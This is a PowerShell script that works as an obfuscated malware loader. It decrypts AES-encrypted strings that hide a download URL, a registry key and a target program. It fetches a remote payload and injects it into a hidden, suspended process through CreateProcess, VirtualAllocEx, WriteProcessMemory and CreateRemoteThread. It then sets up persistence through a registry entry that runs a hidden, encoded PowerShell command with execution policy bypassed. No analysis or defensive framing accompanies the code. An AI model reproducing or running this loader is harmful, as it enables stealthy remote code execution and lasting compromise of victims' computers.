[System.Threading.Thread]::CurrentThread.CurrentCulture = [System.Globalization.CultureInfo]::InvariantCulture
[System.Threading.Thread]::CurrentThread.CurrentUICulture = [System.Globalization.CultureInfo]::InvariantCulture
$ErrorActionPreference = ("{3}{2}{0}{1}"-f't','lyContinue','len','Si')

function fnCalc {
    $seg = 100
    $inc = 4.0 / $seg
    $acc = 0.0
    for ($i = 0; $i -lt $seg; $i++) {
        $x = $i * $inc
        $acc += ($x * $x) * $inc
    }
    $dPart = 12.0
    $sum = $acc + $dPart
    return [math]::Round($sum, 5).ToString().Replace('.', '')
}

$lineA = ("{2}{6}{5}{3}{1}{4}{0}" -f 'j_xof','_spm','god_y','vo','u','_re','zal_eht')
$lineB = ("{2}{0}{1}"-f'ci','uq_','_nworb_k')
$lineC = "eht"
$all = $lineA + $lineB + $lineC

function fnKey($calcVal, $ss) {
    $combo = $calcVal + $ss
    if ($combo.Length -lt 16) { $combo += "0" * (16 - $combo.Length) }
    return [Text.Encoding]::UTF8.GetBytes($combo.Substring(0, 16))
}

$z = fnCalc
$k = fnKey $z $all
$v = New-Object Byte[](16)

function fnDec {
    param(
        [string]$c,
        [byte[]]$kk,
        [byte[]]$iv
    )
    [byte[]]$raw = [Convert]::FromBase64String($c)
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $kk
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $dec = $aes.CreateDecryptor()
    [byte[]]$out = $dec.TransformFinalBlock($raw, 0, $raw.Length)
    $aes.Dispose()
    return [Text.Encoding]::UTF8.GetString($out)
}

$a1 = ("{14}{20}{25}{26}{1}{8}{21}{17}{22}{23}{24}{19}{11}{9}{15}{0}{4}{16}{10}{18}{6}{7}{3}{12}{5}{2}{13}"-f'ph/','vCxjFw','FB','bg1ZKMA','oN','xJT','r9t','4l','9','IoFY','z','Ouzp','LwTS','O8nz2bk=','abS53','7FfkKMAYtjVKA','gHraeQ','6hJ4s','8R+olyl/Pj6f','U','U','mYKXvGM','e','E','O','u','mAg9')
$a2 = ("{14}{5}{4}{6}{10}{12}{16}{13}{2}{1}{18}{15}{17}{7}{8}{11}{3}{9}{0}" -f '6lKqpJdFHR4Lw/Mw==','FEE','JxH','1hSqjM','l','l2','k','N','Og','x','3lqm2hBfXcBCcw7LN','uXgTl2','V','5','/','JrO9','k6E','jkJKl','ZJFHPw2DbXwi')
$a3 = ("{3}{2}{11}{9}{5}{6}{1}{7}{0}{10}{4}{8}"-f 'ScI+Tf','V0kPj','zu','b','fn85U','g','f2','uOqDSHhx','Stx7U=','8u','UWoCR','v')
$a4 = ("{3}{10}{5}{4}{0}{7}{2}{1}{6}{8}{9}"-f 'dL7r','AV','P','I','gCU9z9piuRgq','hx','bCA9jh','s2','g7k3','ohxizo=','dXv')

try {
    $u  = fnDec -c $a1 -kk $k -iv $v  
    $rp = fnDec -c $a2 -kk $k -iv $v 
    $px = fnDec -c $a3 -kk $k -iv $v  
    $rv = fnDec -c $a4 -kk $k -iv $v  
} catch {
    return
}

# --- Conditional load for the xR C# type ---
if (-not ("xR" -as [Type])) {
    Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class xR {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CreateProcess(
        string lpApplicationName, 
        string lpCommandLine,
        IntPtr lpProcessAttributes, 
        IntPtr lpThreadAttributes, 
        bool bInheritHandles,
        uint dwCreationFlags, 
        IntPtr lpEnvironment, 
        string lpCurrentDirectory,
        ref SI lpStartupInfo, 
        out PI lpProcessInformation
    );
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess, 
        IntPtr lpAddress,
        uint dwSize, 
        uint flAllocationType, 
        uint flProtect
    );
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess, 
        IntPtr lpBaseAddress, 
        byte[] lpBuffer, 
        int nSize, 
        out IntPtr lpNumberOfBytesWritten
    );
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess, 
        IntPtr lpThreadAttributes, 
        uint dwStackSize, 
        IntPtr lpStartAddress, 
        IntPtr lpParameter, 
        uint dwCreationFlags, 
        out IntPtr lpThreadId
    );
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(IntPtr hThread);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
    public struct SI {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PI {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
    public static bool zQ(byte[] pl, string tx) {
        // If token parsing issues occur, try using an inline comment in the type cast:
        // For example: [Type]( /*fix*/ 'xR')
        SI si = new SI();
        si.cb = (uint)Marshal.SizeOf(si);
        si.dwFlags = 0x00000001;
        si.wShowWindow = 0;
        PI pi = new PI();
        uint cf = 0x08000000 | 0x4; 
        bool ok = CreateProcess(tx, null, IntPtr.Zero, IntPtr.Zero, false, cf, IntPtr.Zero, null, ref si, out pi);
        if(!ok) return false;
        IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)pl.Length, 0x3000, 0x40);
        if(addr == IntPtr.Zero) return false;
        IntPtr tmp;
        bool wr = WriteProcessMemory(pi.hProcess, addr, pl, pl.Length, out tmp);
        if(!wr || (int)tmp != pl.Length) return false;
        IntPtr thrId;
        IntPtr thr = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out thrId);
        if(thr == IntPtr.Zero) return false;
        ResumeThread(pi.hThread);
        return true;
    }
}
"@
}

try {
    $wc = New-Object System.Net.WebClient
    [byte[]]$payload = $wc.DownloadData($u)
    if ($payload -and $payload.Length -gt 0) {
        [xR]::zQ($payload, $px) | Out-Null
    }
} catch {
    return
}

$st = @'
param([string]$u, [string]$p)
try {
  $wc = New-Object System.Net.WebClient
  [byte[]]$b = $wc.DownloadData($u)
  # Conditional load for xR in this new session
  if (-not ("xR" -as [Type])) {
      Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class xR {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CreateProcess(string a, string c, IntPtr pa, IntPtr ta, bool i, uint f, IntPtr e, string d, ref SI si, out PI pi);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hp, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hp, IntPtr ba, byte[] buf, int n, out IntPtr wr);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hp, IntPtr attr, uint st, IntPtr sa, IntPtr pr, uint fl, out IntPtr t2);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(IntPtr hT);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
    public struct SI {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PI {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
    public static bool zQ(byte[] pl, string tx) {
        SI si = new SI();
        si.cb = (uint)System.Runtime.InteropServices.Marshal.SizeOf(si);
        si.dwFlags = 0x00000001;
        si.wShowWindow = 0;
        PI pi = new PI();
        uint cf = 0x08000000 | 0x4;
        bool ok = CreateProcess(tx, null, IntPtr.Zero, IntPtr.Zero, false, cf, IntPtr.Zero, null, ref si, out pi);
        if(!ok) return false;
        IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)pl.Length, 0x3000, 0x40);
        if(addr == IntPtr.Zero) return false;
        IntPtr wr;
        bool w2 = WriteProcessMemory(pi.hProcess, addr, pl, pl.Length, out wr);
        if(!w2 || (int)wr != pl.Length) return false;
        IntPtr tid;
        IntPtr thr = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out tid);
        if(thr == IntPtr.Zero) return false;
        ResumeThread(pi.hThread);
        return true;
    }
}
"@
  }
  [xR]::zQ($b, $p) | Out-Null
} catch {}
'@

$stB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($st))
$rcmd = ('p'+'owe'+'rshell.ex'+'e '+'-No'+'Profile'+' '+'-'+'Wi'+'ndowStyle '+'Hi'+'dden '+'-Exe'+'cution'+'Po'+'lic'+'y '+'By'+'pass '+'-En'+'codedCom'+'ma'+'nd '+"$stB64 "+'-u'+' '+"`"$u`" "+'-'+'p '+"`"$px`"")

try {
    New-ItemProperty -Path $rp -Name $rv -Value $rcmd -PropertyType String -Force | Out-Null
} catch {}
